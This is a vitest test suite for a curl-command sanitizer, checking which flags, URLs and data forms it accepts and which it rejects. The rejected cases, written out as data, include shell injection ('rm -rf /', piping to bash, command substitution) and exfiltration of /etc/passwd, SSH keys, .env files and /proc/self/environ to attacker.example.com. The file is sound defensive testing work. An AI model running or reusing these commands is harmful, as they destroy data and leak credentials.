import { describe, it, expect } from "vitest";
import { sanitize } from "../sanitizer";

describe("sanitize", () => {
  describe("valid commands", () => {
    it("accepts a simple GET request", () => {
      const result = sanitize("curl https://api.example.com");
      expect(result.valid).toBe(true);
      expect(result.sanitizedArgs).toEqual(["https://api.example.com"]);
    });

    it("accepts POST with headers and body", () => {
      const result = sanitize(
        "curl -X POST -H 'Content-Type: application/json' -d '{\"key\":\"val\"}' https://api.example.com"
      );
      expect(result.valid).toBe(true);
      expect(result.sanitizedArgs).toContain("-X");
      expect(result.sanitizedArgs).toContain("POST");
      expect(result.sanitizedArgs).toContain("-H");
      expect(result.sanitizedArgs).toContain("https://api.example.com");
    });

    it("accepts -u for basic auth", () => {
      const result = sanitize("curl -u 'user:pass' https://example.com");
      expect(result.valid).toBe(true);
    });

    it("accepts -L for follow redirects", () => {
      const result = sanitize("curl -L https://example.com");
      expect(result.valid).toBe(true);
      expect(result.sanitizedArgs).toContain("-L");
    });

    it("accepts -k for insecure", () => {
      const result = sanitize("curl -k https://example.com");
      expect(result.valid).toBe(true);
    });

    it("accepts -s -S silent flags", () => {
      const result = sanitize("curl -s -S https://example.com");
      expect(result.valid).toBe(true);
    });

    it("accepts --connect-timeout and --max-time", () => {
      const result = sanitize("curl --connect-timeout 10 --max-time 30 https://example.com");
      expect(result.valid).toBe(true);
    });

    it("accepts --data-raw and --data-binary", () => {
      const r1 = sanitize("curl --data-raw 'test' https://example.com");
      const r2 = sanitize("curl --data-binary 'test' https://example.com");
      expect(r1.valid).toBe(true);
      expect(r2.valid).toBe(true);
    });

    it("accepts http:// URLs", () => {
      const result = sanitize("curl http://example.com");
      expect(result.valid).toBe(true);
    });

    it("accepts --flag=value syntax for allowed flags", () => {
      const result = sanitize("curl --connect-timeout=10 https://example.com");
      expect(result.valid).toBe(true);
      expect(result.sanitizedArgs).toContain("--connect-timeout=10");
    });

    it("accepts URLs with query parameters containing &", () => {
      const result = sanitize("curl 'https://api.example.com?a=1&b=2&c=3'");
      expect(result.valid).toBe(true);
      expect(result.sanitizedArgs).toContain("https://api.example.com?a=1&b=2&c=3");
    });

    it("accepts JSON body containing $", () => {
      const result = sanitize(`curl -d '{"price": "$100"}' https://example.com`);
      expect(result.valid).toBe(true);
    });

    it("accepts body with special characters inside quotes", () => {
      const result = sanitize(`curl -d '{"query": "a & b | c > d"}' https://example.com`);
      expect(result.valid).toBe(true);
    });
  });

  describe("rejected commands", () => {
    it("rejects commands not starting with curl", () => {
      const result = sanitize("wget https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("must start with 'curl'");
    });

    it("rejects empty input", () => {
      const result = sanitize("");
      expect(result.valid).toBe(false);
    });

    it("rejects shell semicolons with injected commands", () => {
      // "rm" is not a valid URL (no http/https prefix)
      const result = sanitize("curl https://example.com; rm -rf /");
      expect(result.valid).toBe(false);
    });

    it("rejects pipe with injected commands", () => {
      const result = sanitize("curl https://example.com | bash");
      expect(result.valid).toBe(false);
    });

    it("rejects && chaining", () => {
      const result = sanitize("curl https://example.com && echo pwned");
      expect(result.valid).toBe(false);
    });

    it("rejects backticks", () => {
      const result = sanitize("curl `echo evil` https://example.com");
      expect(result.valid).toBe(false);
    });

    it("rejects $() command substitution", () => {
      const result = sanitize("curl $(cat /etc/passwd) https://example.com");
      expect(result.valid).toBe(false);
    });

    it("rejects > redirect", () => {
      const result = sanitize("curl https://example.com > /tmp/out");
      expect(result.valid).toBe(false);
    });

    it("rejects < redirect", () => {
      const result = sanitize("curl https://example.com < /tmp/in");
      expect(result.valid).toBe(false);
    });

    it("rejects newlines with injected commands", () => {
      // "rm" is not a valid flag or http URL, so it's caught by flag/URL validation
      const result = sanitize("curl https://example.com\nrm -rf /");
      expect(result.valid).toBe(false);
    });

    it("allows multi-line JSON body in quotes", () => {
      const result = sanitize(`curl -X POST -d '{\n  "name": "test"\n}' https://example.com`);
      expect(result.valid).toBe(true);
    });

    it("rejects -o flag (file write)", () => {
      const result = sanitize("curl -o /tmp/output https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("not allowed");
    });

    it("rejects --output flag (file write)", () => {
      const result = sanitize("curl --output /tmp/output https://example.com");
      expect(result.valid).toBe(false);
    });

    it("rejects -O flag (write to filename)", () => {
      const result = sanitize("curl -O https://example.com/file.txt");
      expect(result.valid).toBe(false);
    });

    it("rejects -D flag (dump headers to file)", () => {
      const result = sanitize("curl -D /tmp/headers https://example.com");
      expect(result.valid).toBe(false);
    });

    it("rejects -w flag (write-out can leak info)", () => {
      const result = sanitize("curl -w '%{http_code}' https://example.com");
      expect(result.valid).toBe(false);
    });

    it("rejects ftp:// protocol", () => {
      const result = sanitize("curl ftp://evil.com/file");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("http:// or https://");
    });

    it("rejects file:// protocol", () => {
      const result = sanitize("curl file:///etc/passwd");
      expect(result.valid).toBe(false);
    });

    it("rejects unknown flags", () => {
      const result = sanitize("curl --proxy socks5://evil https://example.com");
      expect(result.valid).toBe(false);
    });

    it("rejects flag missing required value", () => {
      const result = sanitize("curl -H");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("requires a value");
    });

    it("rejects curl with no URL", () => {
      const result = sanitize("curl -H 'Content-Type: application/json'");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("No URL found");
    });
  });

  describe("form-data (-F) validation", () => {
    it("accepts -F with text value", () => {
      const result = sanitize("curl -F 'name=test' https://example.com");
      expect(result.valid).toBe(true);
      expect(result.sanitizedArgs).toContain("-F");
      expect(result.sanitizedArgs).toContain("name=test");
    });

    it("accepts -F with valid file path", () => {
      const result = sanitize("curl -F 'file=@/tmp/relay-uploads/user/abc.txt' https://example.com");
      expect(result.valid).toBe(true);
    });

    it("rejects -F with file path outside upload dir", () => {
      const result = sanitize("curl -F 'file=@/etc/passwd' https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("upload directory");
    });

    it("rejects -F with path traversal", () => {
      const result = sanitize("curl -F 'file=@/tmp/relay-uploads/../../../etc/passwd' https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("traversal");
    });

    it("accepts --form long flag", () => {
      const result = sanitize("curl --form 'key=val' https://example.com");
      expect(result.valid).toBe(true);
    });

    it("rejects -F with < file content reference", () => {
      const result = sanitize("curl -F 'field=</etc/passwd' https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("File content references");
    });

    it("rejects --form with < file content reference", () => {
      const result = sanitize("curl --form 'field=</etc/secret' https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("File content references");
    });

    it("rejects --form=key=<file equals syntax", () => {
      const result = sanitize("curl --form=field=</etc/secret https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("File content references");
    });

    it("allows -F with value containing < not at start", () => {
      const result = sanitize("curl -F 'field=a<b' https://example.com");
      expect(result.valid).toBe(true);
    });

    it("rejects -F=key=@/etc/passwd (equals syntax, outside upload dir)", () => {
      const result = sanitize("curl --form=file=@/etc/passwd https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("upload directory");
    });
  });

  describe("data flag file reference blocking", () => {
    it("rejects -d with @file reference", () => {
      const result = sanitize("curl -d @/etc/passwd https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("File references");
    });

    it("rejects --data with @file reference", () => {
      const result = sanitize("curl --data @/etc/passwd https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("File references");
    });

    it("rejects --data-raw with @file reference", () => {
      const result = sanitize("curl --data-raw @/tmp/secret https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("File references");
    });

    it("rejects --data-binary with @file reference", () => {
      const result = sanitize("curl --data-binary @/tmp/secret https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("File references");
    });

    it("rejects --data=@file (equals syntax)", () => {
      const result = sanitize("curl --data=@/etc/passwd https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("File references");
    });

    it("rejects --data-raw=@file (equals syntax)", () => {
      const result = sanitize("curl --data-raw=@/etc/shadow https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("File references");
    });

    it("rejects --data-binary=@file (equals syntax)", () => {
      const result = sanitize("curl --data-binary=@/root/.ssh/id_rsa https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("File references");
    });

    it("allows -d with normal JSON body", () => {
      const result = sanitize(`curl -d '{"key":"value"}' https://example.com`);
      expect(result.valid).toBe(true);
    });

    it("allows -d with body containing @ not at start", () => {
      const result = sanitize(`curl -d '{"email":"user@example.com"}' https://example.com`);
      expect(result.valid).toBe(true);
    });

    it("allows --data=value (equals syntax, no @)", () => {
      const result = sanitize("curl --data=hello https://example.com");
      expect(result.valid).toBe(true);
    });

    it("rejects -d with < prefix (defensive)", () => {
      const result = sanitize("curl -d '</etc/passwd' https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("File content references");
    });

    it("rejects --data-binary=<file (equals syntax, defensive)", () => {
      const result = sanitize("curl --data-binary=</proc/self/environ https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("File content references");
    });
  });

  describe("cookie flag file reference blocking", () => {
    it("rejects -b with bare file path", () => {
      const result = sanitize("curl -b /tmp/cookies.txt https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("Cookie file");
    });

    it("rejects --cookie with bare file path", () => {
      const result = sanitize("curl --cookie /tmp/cookies.txt https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("Cookie file");
    });

    it("rejects --cookie=/path (equals syntax, no = in value)", () => {
      const result = sanitize("curl --cookie=/tmp/cookies.txt https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("Cookie file");
    });

    it("allows -b with inline cookie (key=value)", () => {
      const result = sanitize("curl -b 'session=abc123' https://example.com");
      expect(result.valid).toBe(true);
    });

    it("allows -b with multiple inline cookies", () => {
      const result = sanitize("curl -b 'session=abc; token=xyz' https://example.com");
      expect(result.valid).toBe(true);
    });

    it("allows --cookie=key=value (equals syntax with inline cookie)", () => {
      const result = sanitize("curl --cookie=session=abc123 https://example.com");
      expect(result.valid).toBe(true);
    });

    it("rejects -b with @file reference", () => {
      const result = sanitize("curl -b @/app/.env https://example.com");
      expect(result.valid).toBe(false);
    });
  });

  describe("universal @ and < blocking for all flags", () => {
    it("rejects -H with @file (header file read, curl 7.55+)", () => {
      const result = sanitize("curl -H @/etc/passwd https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("File references");
    });

    it("rejects --header=@file (equals syntax)", () => {
      const result = sanitize("curl --header=@/proc/self/environ https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("File references");
    });

    it("rejects -H with <file reference", () => {
      const result = sanitize("curl -H '</etc/passwd' https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("File content references");
    });

    it("rejects -u with @file reference", () => {
      const result = sanitize("curl -u @/app/.env https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("File references");
    });

    it("rejects -A with @file reference", () => {
      const result = sanitize("curl -A @/etc/hostname https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("File references");
    });

    it("rejects -X with @file reference", () => {
      const result = sanitize("curl -X @/tmp/method https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("File references");
    });

    it("rejects --max-time=@file (equals syntax)", () => {
      const result = sanitize("curl --max-time=@/tmp/val https://example.com");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("File references");
    });

    it("allows normal -H header value", () => {
      const result = sanitize("curl -H 'Authorization: Bearer token123' https://example.com");
      expect(result.valid).toBe(true);
    });

    it("allows -H value containing @ not at start", () => {
      const result = sanitize("curl -H 'X-Email: user@example.com' https://example.com");
      expect(result.valid).toBe(true);
    });

    it("allows -u with normal user:pass", () => {
      const result = sanitize("curl -u 'admin:p@ssword' https://example.com");
      expect(result.valid).toBe(true);
    });

    it("allows -A with normal user agent string", () => {
      const result = sanitize("curl -A 'Mozilla/5.0' https://example.com");
      expect(result.valid).toBe(true);
    });
  });

  describe("exfiltration attack scenarios", () => {
    it("blocks --data @/proc/self/environ to attacker", () => {
      const result = sanitize("curl --data @/proc/self/environ https://attacker.example.com");
      expect(result.valid).toBe(false);
    });

    it("blocks -b /app/.env to attacker", () => {
      const result = sanitize("curl -b /app/.env https://attacker.example.com");
      expect(result.valid).toBe(false);
    });

    it("blocks -F 'x=</etc/secret' to attacker", () => {
      const result = sanitize("curl -F 'x=</etc/secret' https://attacker.example.com");
      expect(result.valid).toBe(false);
    });

    it("blocks -H @/proc/self/environ (header exfiltration)", () => {
      const result = sanitize("curl -H @/proc/self/environ https://attacker.example.com");
      expect(result.valid).toBe(false);
    });

    it("blocks --data-binary @/app/.env", () => {
      const result = sanitize("curl --data-binary @/app/.env https://attacker.example.com");
      expect(result.valid).toBe(false);
    });

    it("blocks -F 'file=@/root/.ssh/id_rsa' (outside upload dir)", () => {
      const result = sanitize("curl -F 'file=@/root/.ssh/id_rsa' https://attacker.example.com");
      expect(result.valid).toBe(false);
    });
  });
});
